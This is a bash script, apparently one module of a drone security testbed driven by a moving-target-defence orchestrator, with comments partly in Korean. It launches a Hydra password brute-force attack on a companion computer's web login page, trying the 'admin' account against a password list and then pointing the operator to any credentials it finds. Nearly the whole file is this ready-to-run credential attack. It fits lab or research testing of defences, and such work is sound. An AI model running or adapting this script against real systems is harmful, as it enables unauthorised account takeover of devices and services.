#!/usr/bin/env bash
set -euo pipefail

# Attack: Companion Computer Web UI Login Brute Force (Hydra, MTD-aware)
# Target Service: COMPANION_HTTP (Default Port 3000)

# --- MTD_INTERFACE_START (Mandatory dynamic target acquisition) ---
# Orchestrator가 TARGET_IP, TARGET_PORT, TARGET_SERVICE를 주입해야 합니다.
if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
    exit 1
fi

# 서비스 타입별 기본 포트 설정 (Companion HTTP 로그인 페이지를 기본으로 가정)
case "${TARGET_SERVICE:-COMPANION_HTTP}" in
    COMPANION_HTTP)
        TARGET_PORT="${TARGET_PORT:-3000}"
        ;;
    *)
        : # 다른 서비스는 Orchestrator가 포트 값을 넣어준다고 가정
        ;;
esac

echo "[INFO] Target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-COMPANION_HTTP})"
# --- MTD_INTERFACE_END ---

# --- Common Log/BASE Setup ---
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then
    . "$BASE/00_env.sh"
else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"
    mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }
    export -f log
fi

log "[ATTACK] id=companion-computer-web-ui-login-brute-force src=Companion-Computer-Web-UI-Login-Brute-Force.md"

log "[BLOCK 1] type=shell (Hydra Login Brute Force Attack)"
# 하드코딩된 주소와 포트(localhost:3000) 대신 동적 환경 변수 사용
# 주의: 이 스크립트가 실행되는 환경에 'passwords.txt' 파일이 존재해야 합니다.
# -s ${TARGET_PORT}: 포트 지정
# -t 16: 쓰레드 수 (선택적)
sudo hydra -l admin -P passwords.txt "${TARGET_IP}" http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid" -s "${TARGET_PORT}" -t 16

log "[BLOCK 2] type=control (Attack Completed)"
echo "[INFO] Brute force attempt finished against ${TARGET_IP}:${TARGET_PORT}. Check above logs for successful credentials."